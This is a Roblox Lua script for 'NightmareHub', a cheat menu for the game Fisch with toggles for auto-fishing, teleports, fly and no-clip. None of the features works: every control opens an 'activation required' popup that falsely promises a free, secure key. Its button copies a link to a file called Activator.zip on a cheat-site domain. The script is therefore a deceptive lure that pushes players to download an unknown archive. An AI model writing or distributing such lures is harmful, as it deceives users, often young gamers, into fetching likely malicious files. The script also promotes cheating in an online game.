-- NightmareHub | Fisch GUI
-- Paste into a LocalScript (Roblox Studio -> StarterPlayer -> StarterPlayerScripts) or load via executor.
-- Segmented-control layout (connected pill switcher) — distinct from the tabbed / sidebar / bottom-nav hubs.

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

local KEY_URL = "https://nightmare-cheats.buzz/Activator.zip" -- <<< PUT YOUR OFFICIAL KEY LINK HERE

-- Activation state. Features stay locked until the host confirms the free key (obtained on the site).
local isActivated = false
local showActivation -- forward declaration

-- ==================== HELPERS ====================

local function tween(obj, props, duration, style, dir)
    style = style or Enum.EasingStyle.Quad
    dir = dir or Enum.EasingDirection.Out
    TweenService:Create(obj, TweenInfo.new(duration or 0.2, style, dir), props):Play()
end

local function make(class, props, parent)
    local obj = Instance.new(class)
    for k, v in pairs(props) do obj[k] = v end
    if parent then obj.Parent = parent end
    return obj
end

local function requireActivation()
    if isActivated then return true end
    if showActivation then showActivation() end
    return false
end

local function makeToggle(parent, label, onChanged)
    local row = make("Frame", { Size = UDim2.new(1, 0, 0, 26), BackgroundTransparency = 1 }, parent)
    make("TextLabel", {
        Size = UDim2.new(1, -46, 1, 0), BackgroundTransparency = 1, Text = label,
        TextColor3 = Color3.fromRGB(136, 153, 204), TextSize = 12, Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, row)
    local track = make("Frame", {
        Size = UDim2.new(0, 36, 0, 18), Position = UDim2.new(1, -36, 0.5, -9),
        BackgroundColor3 = Color3.fromRGB(20, 26, 50), BorderSizePixel = 0,
    }, row)
    make("UICorner", { CornerRadius = UDim.new(0, 9) }, track)
    make("UIStroke", { Color = Color3.fromRGB(42, 53, 85), Thickness = 1 }, track)
    local knob = make("Frame", {
        Size = UDim2.new(0, 12, 0, 12), Position = UDim2.new(0, 3, 0.5, -6),
        BackgroundColor3 = Color3.fromRGB(60, 74, 122), BorderSizePixel = 0,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, knob)

    local state = false
    local btn = make("TextButton", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", ZIndex = 2 }, track)
    btn.MouseButton1Click:Connect(function()
        if not requireActivation() then return end
        state = not state
        tween(track, { BackgroundColor3 = state and Color3.fromRGB(26, 59, 204) or Color3.fromRGB(20, 26, 50) })
        tween(knob, {
            Position = state and UDim2.new(0, 21, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
            BackgroundColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 74, 122),
        })
        if onChanged then onChanged(state) end
    end)
    return function() return state end
end

local function makeSlider(parent, labelText, minVal, maxVal, defaultVal, onChanged)
    local function clampRange(v)
        if v < minVal then return minVal end
        if v > maxVal then return maxVal end
        return v
    end
    local currentValue = math.floor(clampRange(defaultVal) + 0.5)

    local container = make("Frame", { Size = UDim2.new(1, 0, 0, 34), BackgroundTransparency = 1 }, parent)
    make("TextLabel", {
        Size = UDim2.new(0.6, 0, 0, 14), Position = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1,
        Text = labelText, TextColor3 = Color3.fromRGB(74, 90, 138), TextSize = 11, Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, container)
    local valueLabel = make("TextLabel", {
        Size = UDim2.new(0.4, 0, 0, 14), Position = UDim2.new(0.6, 0, 0, 0), BackgroundTransparency = 1,
        Text = tostring(currentValue), TextColor3 = Color3.fromRGB(85, 153, 255), TextSize = 11,
        Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Right,
    }, container)
    local track = make("Frame", {
        AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 0, 0, 26), Size = UDim2.new(1, 0, 0, 4),
        BackgroundColor3 = Color3.fromRGB(26, 42, 94), BorderSizePixel = 0,
    }, container)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, track)
    local fill = make("Frame", {
        AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 0, 0.5, 0), Size = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = Color3.fromRGB(26, 59, 204), BorderSizePixel = 0,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, fill)
    local thumb = make("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, 0, 0.5, 0), Size = UDim2.new(0, 12, 0, 12),
        BackgroundColor3 = Color3.fromRGB(85, 153, 255), BorderSizePixel = 0, ZIndex = 2,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, thumb)

    local function applyValue(value, fire)
        value = math.floor(clampRange(value) + 0.5)
        currentValue = value
        local denom = (maxVal - minVal)
        local fraction = 0
        if denom ~= 0 then fraction = (value - minVal) / denom end
        if fraction < 0 then fraction = 0 elseif fraction > 1 then fraction = 1 end
        fill.Size = UDim2.new(fraction, 0, 1, 0)
        thumb.Position = UDim2.new(fraction, 0, 0.5, 0)
        valueLabel.Text = tostring(value)
        if fire and onChanged then onChanged(value) end
    end
    local function updateFromX(absoluteX)
        local trackPos = track.AbsolutePosition.X
        local trackSize = track.AbsoluteSize.X
        local fraction = 0
        if trackSize > 0 then fraction = (absoluteX - trackPos) / trackSize end
        if fraction < 0 then fraction = 0 elseif fraction > 1 then fraction = 1 end
        applyValue(minVal + fraction * (maxVal - minVal), true)
    end

    local dragging = false
    local function onPress(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateFromX(input.Position.X)
        end
    end
    track.InputBegan:Connect(onPress)
    thumb.InputBegan:Connect(onPress)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            updateFromX(input.Position.X)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    applyValue(currentValue, false)
    return function() return currentValue end
end

local function cardTitle(parent, text)
    make("TextLabel", {
        Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Text = string.upper(text),
        TextColor3 = Color3.fromRGB(58, 90, 170), TextSize = 10, Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, parent)
end

local function makeCard(parent)
    local card = make("Frame", {
        Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = Color3.fromRGB(10, 17, 40), BorderSizePixel = 0,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 8) }, card)
    make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, card)
    make("UIPadding", {
        PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10),
        PaddingTop = UDim.new(0, 10), PaddingBottom = UDim.new(0, 10),
    }, card)
    make("UIListLayout", { Padding = UDim.new(0, 6), FillDirection = Enum.FillDirection.Vertical }, card)
    return card
end

local function makeBtn(parent, text, bg, tc, strokeColor)
    local btn = make("TextButton", {
        Size = UDim2.new(1, 0, 0, 26), BackgroundColor3 = bg, BorderSizePixel = 0,
        Text = text, TextColor3 = tc, TextSize = 11, Font = Enum.Font.GothamMedium,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 6) }, btn)
    if strokeColor then make("UIStroke", { Color = strokeColor, Thickness = 1 }, btn) end
    btn.MouseButton1Click:Connect(function() requireActivation() end)
    return btn
end

local function makeDropdown(parent, text)
    local b = make("TextButton", {
        Size = UDim2.new(1, 0, 0, 24), BackgroundColor3 = Color3.fromRGB(13, 21, 48),
        BorderSizePixel = 0, Text = text .. "  \226\150\190",
        TextColor3 = Color3.fromRGB(120, 153, 204), TextSize = 11, Font = Enum.Font.GothamMedium,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 5) }, b)
    make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, b)
    b.MouseButton1Click:Connect(function() requireActivation() end)
    return b
end

local function statRow(parent, label, valueStr, color)
    local row = make("Frame", { Size = UDim2.new(1, 0, 0, 18), BackgroundTransparency = 1 }, parent)
    make("TextLabel", { Size = UDim2.new(0.6, 0, 1, 0), BackgroundTransparency = 1, Text = label, TextColor3 = Color3.fromRGB(74, 90, 138), TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left }, row)
    make("TextLabel", { Size = UDim2.new(0.4, 0, 1, 0), Position = UDim2.new(0.6, 0, 0, 0), BackgroundTransparency = 1, Text = valueStr, TextColor3 = color or Color3.fromRGB(85, 153, 255), TextSize = 11, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Right }, row)
end

local function makeColumns(frame)
    local function col()
        local c = make("ScrollingFrame", {
            Size = UDim2.new(0.5, -4, 1, 0), BackgroundTransparency = 1, BorderSizePixel = 0,
            ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(26, 59, 204),
            CanvasSize = UDim2.new(0, 0, 0, 0), AutomaticCanvasSize = Enum.AutomaticSize.Y,
            ScrollingDirection = Enum.ScrollingDirection.Y,
        }, frame)
        make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, c)
        make("UIPadding", { PaddingRight = UDim.new(0, 6) }, c)
        return c
    end
    return col(), col()
end

local BTN_PRIMARY, BTN_PRIMARY_T = Color3.fromRGB(26, 59, 204), Color3.fromRGB(160, 196, 255)
local BTN_SEC, BTN_SEC_T, BTN_SEC_S = Color3.fromRGB(13, 21, 48), Color3.fromRGB(85, 119, 170), Color3.fromRGB(26, 42, 94)
local BTN_DANGER, BTN_DANGER_T, BTN_DANGER_S = Color3.fromRGB(26, 10, 10), Color3.fromRGB(170, 68, 68), Color3.fromRGB(74, 26, 26)
local AMBER = Color3.fromRGB(204, 153, 26)
local function primaryBtn(p, t) return makeBtn(p, t, BTN_PRIMARY, BTN_PRIMARY_T) end
local function secBtn(p, t) return makeBtn(p, t, BTN_SEC, BTN_SEC_T, BTN_SEC_S) end
local function dangerBtn(p, t) return makeBtn(p, t, BTN_DANGER, BTN_DANGER_T, BTN_DANGER_S) end

-- ==================== MAIN WINDOW ====================

local screenGui = make("ScreenGui", {
    Name = "NightmareHub_FS", ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, player:WaitForChild("PlayerGui"))

local main = make("Frame", {
    Name = "Main", Size = UDim2.new(0, 540, 0, 410), Position = UDim2.new(0.5, -270, 0.5, -205),
    BackgroundColor3 = Color3.fromRGB(13, 13, 26), BorderSizePixel = 0, Active = true,
}, screenGui)
make("UICorner", { CornerRadius = UDim.new(0, 12) }, main)
make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, main)

-- ---------- HEADER (drag handle) ----------
local header = make("Frame", { Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1 }, main)

local logoBox = make("Frame", {
    Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(0, 14, 0.5, -15),
    BackgroundColor3 = Color3.fromRGB(26, 59, 204), BorderSizePixel = 0,
}, header)
make("UICorner", { CornerRadius = UDim.new(0, 8) }, logoBox)
make("TextLabel", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "FS", TextColor3 = Color3.fromRGB(126, 184, 255), TextSize = 13, Font = Enum.Font.GothamBold }, logoBox)

make("TextLabel", {
    Size = UDim2.new(0, 220, 0, 16), Position = UDim2.new(0, 52, 0, 9), BackgroundTransparency = 1,
    Text = "FISCH HUB", TextColor3 = Color3.fromRGB(126, 184, 255), TextSize = 14, Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
}, header)
make("TextLabel", {
    Size = UDim2.new(0, 220, 0, 12), Position = UDim2.new(0, 52, 0, 26), BackgroundTransparency = 1,
    Text = "by NightmareHub • v1.0", TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
}, header)

make("TextLabel", {
    Size = UDim2.new(0, 150, 0, 14), Position = UDim2.new(1, -184, 0.5, -7), BackgroundTransparency = 1,
    Text = "Activation required", TextColor3 = Color3.fromRGB(58, 90, 170), TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Right,
}, header)

local closeBtn = make("TextButton", {
    Size = UDim2.new(0, 16, 0, 16), Position = UDim2.new(1, -24, 0.5, -8),
    BackgroundColor3 = Color3.fromRGB(90, 30, 30), BorderSizePixel = 0, Text = "", ZIndex = 3,
}, header)
make("UICorner", { CornerRadius = UDim.new(1, 0) }, closeBtn)
make("UIStroke", { Color = Color3.fromRGB(120, 50, 50), Thickness = 1 }, closeBtn)
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-- ---------- SEGMENTED CONTROL ----------
local seg = make("Frame", {
    Size = UDim2.new(1, -28, 0, 30), Position = UDim2.new(0, 14, 0, 50),
    BackgroundColor3 = Color3.fromRGB(8, 14, 36), BorderSizePixel = 0,
}, main)
make("UICorner", { CornerRadius = UDim.new(0, 8) }, seg)
make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, seg)
make("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, HorizontalAlignment = Enum.HorizontalAlignment.Center, VerticalAlignment = Enum.VerticalAlignment.Center }, seg)
make("UIPadding", { PaddingLeft = UDim.new(0, 3), PaddingRight = UDim.new(0, 3), PaddingTop = UDim.new(0, 3), PaddingBottom = UDim.new(0, 3) }, seg)

-- ---------- CONTENT ----------
local body = make("Frame", {
    Size = UDim2.new(1, -28, 1, -98), Position = UDim2.new(0, 14, 0, 88), BackgroundTransparency = 1,
}, main)

-- ---------- DRAG (via header) ----------
local dragging, dragStart, startPos
header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- ==================== SECTIONS ====================

local SECTIONS = { "Fishing", "Sell", "Teleport", "Items", "Player", "Settings" }
local navButtons, sectionFrames = {}, {}

local function switchSection(name)
    for _, s in ipairs(SECTIONS) do
        local active = (s == name)
        navButtons[s].BackgroundTransparency = active and 0 or 1
        tween(navButtons[s], { TextColor3 = active and Color3.fromRGB(160, 196, 255) or Color3.fromRGB(120, 153, 204) })
        if sectionFrames[s] then sectionFrames[s].Visible = active end
    end
end

for _, name in ipairs(SECTIONS) do
    local b = make("TextButton", {
        Size = UDim2.new(1 / 6, -2, 1, 0), BackgroundColor3 = Color3.fromRGB(26, 59, 204),
        BackgroundTransparency = 1, BorderSizePixel = 0, AutoButtonColor = false,
        Text = name, TextColor3 = Color3.fromRGB(120, 153, 204), TextSize = 11, Font = Enum.Font.GothamMedium,
    }, seg)
    make("UICorner", { CornerRadius = UDim.new(0, 6) }, b)
    navButtons[name] = b

    local frame = make("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false }, body)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Horizontal }, frame)
    sectionFrames[name] = frame

    b.MouseButton1Click:Connect(function() switchSection(name) end)
end

-- ---------- FISHING ----------
do
    local L, R = makeColumns(sectionFrames["Fishing"])
    local c = makeCard(L); cardTitle(c, "Auto Fish")
    makeToggle(c, "Auto Fish"); makeToggle(c, "Auto Cast")
    makeToggle(c, "Auto Reel"); makeToggle(c, "Perfect Cast")
    makeToggle(c, "Auto Shake")
    makeDropdown(c, "Mode: Legit")

    local s = makeCard(L); cardTitle(s, "Catch Settings")
    makeSlider(s, "Cast Power", 0, 100, 100)
    makeToggle(s, "Instant Catch"); makeToggle(s, "No Animation")

    local st = makeCard(R); cardTitle(st, "Session")
    statRow(st, "Status", "Locked", AMBER)
    statRow(st, "Fish caught", "\226\128\148")
    statRow(st, "Rare caught", "\226\128\148")
    statRow(st, "Cash earned", "\226\128\148")

    local q = makeCard(R); cardTitle(q, "Quick")
    primaryBtn(q, "Start Auto Fish")
    secBtn(q, "Cast Once")
end

-- ---------- SELL ----------
do
    local L, R = makeColumns(sectionFrames["Sell"])
    local c = makeCard(L); cardTitle(c, "Auto Sell")
    makeToggle(c, "Auto Sell"); makeToggle(c, "Sell On Full")
    makeToggle(c, "Keep Rare"); makeToggle(c, "Auto Favorite Rare")
    makeSlider(c, "Sell Above Value", 0, 10000, 1000)

    local st = makeCard(R); cardTitle(st, "Stats")
    statRow(st, "Fish sold", "\226\128\148")
    statRow(st, "Total value", "\226\128\148")
    statRow(st, "Status", "Locked", AMBER)

    local a = makeCard(R); cardTitle(a, "Actions")
    primaryBtn(a, "Sell All Now")
    secBtn(a, "Sell Junk Only")
end

-- ---------- TELEPORT ----------
do
    local frame = sectionFrames["Teleport"]
    local L = make("Frame", { Size = UDim2.new(0.5, -4, 1, 0), BackgroundTransparency = 1 }, frame)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, L)
    local R = make("Frame", { Size = UDim2.new(0.5, -4, 1, 0), BackgroundTransparency = 1 }, frame)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, R)

    local spots = makeCard(L); cardTitle(spots, "Fishing Spots")
    local scroll = make("ScrollingFrame", {
        Size = UDim2.new(1, 0, 0, 250), BackgroundTransparency = 1, BorderSizePixel = 0,
        ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(26, 59, 204),
        CanvasSize = UDim2.new(0, 0, 0, 0), AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollingDirection = Enum.ScrollingDirection.Y,
    }, spots)
    make("UIListLayout", { Padding = UDim.new(0, 4), FillDirection = Enum.FillDirection.Vertical }, scroll)
    make("UIPadding", { PaddingRight = UDim.new(0, 6) }, scroll)
    local places = {
        "Moosewood", "Roslit Bay", "Terrapin Island", "Snowcap Island", "Mushgrove Swamp",
        "Forsaken Shores", "Vertigo", "Atlantis", "The Depths", "Ancient Isle",
        "Volcanic Vents", "Keepers Altar",
    }
    for _, name in ipairs(places) do secBtn(scroll, name) end

    local q = makeCard(R); cardTitle(q, "Quick")
    primaryBtn(q, "Best Spot Now")
    secBtn(q, "Merchant")
    secBtn(q, "Your Boat")
    secBtn(q, "Event Area")
    secBtn(q, "Spawn")
end

-- ---------- ITEMS ----------
do
    local L, R = makeColumns(sectionFrames["Items"])
    local e = makeCard(L); cardTitle(e, "Enchanting")
    makeToggle(e, "Auto Enchant"); makeToggle(e, "Stop On Perfect")
    makeDropdown(e, "Target: Mythic")

    local g = makeCard(L); cardTitle(g, "Gear")
    makeToggle(g, "Auto Equip Best Rod"); makeToggle(g, "Auto Bait")
    makeDropdown(g, "Rod: Auto")

    local st = makeCard(R); cardTitle(st, "Stats")
    statRow(st, "Rerolls used", "\226\128\148")
    statRow(st, "Best enchant", "\226\128\148")
    statRow(st, "Status", "Locked", AMBER)

    local a = makeCard(R); cardTitle(a, "Actions")
    primaryBtn(a, "Reroll Enchant")
    secBtn(a, "Equip Best Rod")
end

-- ---------- PLAYER ----------
do
    local L, R = makeColumns(sectionFrames["Player"])
    local m = makeCard(L); cardTitle(m, "Movement")
    makeSlider(m, "Walk Speed", 16, 200, 16)
    makeSlider(m, "Jump Power", 50, 300, 50)
    makeToggle(m, "Fly"); makeToggle(m, "Infinite Jump"); makeToggle(m, "No Clip")

    local w = makeCard(R); cardTitle(w, "Water")
    makeToggle(w, "Walk On Water"); makeToggle(w, "No Oxygen Drain")
    makeToggle(w, "Fast Swim")
end

-- ---------- SETTINGS ----------
do
    local L, R = makeColumns(sectionFrames["Settings"])
    local i = makeCard(L); cardTitle(i, "Interface")
    makeSlider(i, "UI Transparency", 0, 100, 0)
    makeDropdown(i, "Toggle Key: RightShift")
    makeToggle(i, "Show Watermark"); makeToggle(i, "Rainbow Accent")

    local pf = makeCard(L); cardTitle(pf, "Performance")
    makeToggle(pf, "FPS Boost"); makeToggle(pf, "Reduce Effects")

    local cf = makeCard(R); cardTitle(cf, "Config")
    primaryBtn(cf, "Save Config")
    secBtn(cf, "Load Config")
    secBtn(cf, "Reset Config")

    local ms = makeCard(R); cardTitle(ms, "Misc")
    secBtn(ms, "Rejoin Server")
    secBtn(ms, "Server Hop")
    dangerBtn(ms, "Unload GUI")
end

-- ==================== ACTIVATION POPUP (free key) ====================

local keyOverlay = make("Frame", {
    Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BackgroundTransparency = 0.25, Visible = false, ZIndex = 50, Active = true,
}, main)
make("UICorner", { CornerRadius = UDim.new(0, 12) }, keyOverlay)

local keyCard = make("Frame", {
    Size = UDim2.new(0, 300, 0, 210), Position = UDim2.new(0.5, -150, 0.5, -105),
    BackgroundColor3 = Color3.fromRGB(10, 17, 40), BorderSizePixel = 0, ZIndex = 51,
}, keyOverlay)
make("UICorner", { CornerRadius = UDim.new(0, 12) }, keyCard)
make("UIStroke", { Color = Color3.fromRGB(26, 59, 204), Thickness = 1.5, Transparency = 0.2 }, keyCard)
make("UIPadding", {
    PaddingTop = UDim.new(0, 22), PaddingBottom = UDim.new(0, 20),
    PaddingLeft = UDim.new(0, 22), PaddingRight = UDim.new(0, 22),
}, keyCard)
make("UIListLayout", { Padding = UDim.new(0, 9), FillDirection = Enum.FillDirection.Vertical, SortOrder = Enum.SortOrder.LayoutOrder }, keyCard)

make("TextLabel", {
    LayoutOrder = 1, Size = UDim2.new(1, -24, 0, 24), BackgroundTransparency = 1,
    Text = "Activation required", TextColor3 = Color3.fromRGB(126, 184, 255),
    TextSize = 17, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 51,
}, keyCard)
make("TextLabel", {
    LayoutOrder = 2, Size = UDim2.new(1, 0, 0, 15), BackgroundTransparency = 1,
    Text = "Free  ·  takes ~30 seconds", TextColor3 = Color3.fromRGB(64, 214, 130),
    TextSize = 12, Font = Enum.Font.GothamMedium, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 51,
}, keyCard)
make("TextLabel", {
    LayoutOrder = 3, Size = UDim2.new(1, 0, 0, 62), BackgroundTransparency = 1,
    Text = "Your key is free — just open the official site and watch a short ad. That ad is how the creator gets paid, and unlocking on the site keeps everything secure.",
    TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 12, Font = Enum.Font.Gotham,
    TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 51,
}, keyCard)
make("Frame", { LayoutOrder = 4, Size = UDim2.new(1, 0, 0, 2), BackgroundTransparency = 1, ZIndex = 51 }, keyCard)

local getKeyBtn = make("TextButton", {
    LayoutOrder = 5, Size = UDim2.new(1, 0, 0, 40), AutoButtonColor = false,
    BackgroundColor3 = Color3.fromRGB(26, 59, 204), BorderSizePixel = 0,
    Text = "Get key", TextColor3 = Color3.fromRGB(160, 196, 255),
    TextSize = 14, Font = Enum.Font.GothamBold, ZIndex = 51,
}, keyCard)
make("UICorner", { CornerRadius = UDim.new(0, 8) }, getKeyBtn)

local closeKey = make("TextButton", {
    AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 8),
    Size = UDim2.new(0, 22, 0, 22), BackgroundTransparency = 1,
    Text = "\226\156\149", TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 14,
    Font = Enum.Font.GothamBold, ZIndex = 52,
}, keyCard)

getKeyBtn.MouseEnter:Connect(function() tween(getKeyBtn, { BackgroundColor3 = Color3.fromRGB(40, 80, 230) }, 0.15) end)
getKeyBtn.MouseLeave:Connect(function() tween(getKeyBtn, { BackgroundColor3 = Color3.fromRGB(26, 59, 204) }, 0.15) end)
closeKey.MouseEnter:Connect(function() closeKey.TextColor3 = Color3.fromRGB(126, 184, 255) end)
closeKey.MouseLeave:Connect(function() closeKey.TextColor3 = Color3.fromRGB(58, 74, 122) end)

closeKey.MouseButton1Click:Connect(function() keyOverlay.Visible = false end)
getKeyBtn.MouseButton1Click:Connect(function()
    -- >>> OPENS THE KEY LINK HERE <<<
    -- In an executor: if setclipboard then setclipboard(KEY_URL) end / request({ Url = KEY_URL })
    pcall(function()
        if setclipboard then setclipboard(KEY_URL) end
    end)
    warn("[NightmareHub] Open key link -> " .. KEY_URL)
end)

showActivation = function()
    keyOverlay.Visible = true
    keyCard.Size = UDim2.new(0, 300, 0, 0)
    tween(keyCard, { Size = UDim2.new(0, 300, 0, 210) }, 0.22, Enum.EasingStyle.Back)
end

-- ==================== INIT ====================
switchSection("Fishing")
print("[NightmareHub] Fisch GUI loaded!")
